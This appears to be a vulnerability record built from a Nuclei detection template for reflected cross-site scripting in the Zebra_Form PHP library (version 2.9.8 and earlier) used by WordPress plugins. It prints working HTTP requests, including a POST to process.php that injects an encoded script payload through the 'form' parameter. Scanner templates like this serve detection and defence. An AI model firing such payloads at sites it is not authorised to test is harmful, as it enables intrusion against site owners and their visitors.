# Vulnerability: Zebra_Form PHP Library <= 2.9.8 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`wordpress-zebra-form-xss.yaml`)

## Description
Zebra_Form PHP library 2.9.8 and prior (which is used by some WordPress plugins) is affected by reflected cross-site scripting vulnerabilities via process.php.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /wp-content/plugins/wp-ticket/readme.txt HTTP/1.1
Host: {{Hostname}}

POST /wp-content/plugins/wp-ticket/assets/ext/zebraform/process.php?form=%3C/script%3E%3Cimg%20src%20onerror=alert(document.domain)%3E&control=upload HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Content-Type: multipart/form-data; boundary=---------------------------77916619616724262872902741074
Origin: null

-----------------------------77916619616724262872902741074
Content-Disposition: form-data; name="upload"; filename="{{randstr}}.txt"
Content-Type: text/plain
Test
-----------------------------77916619616724262872902741074--
```

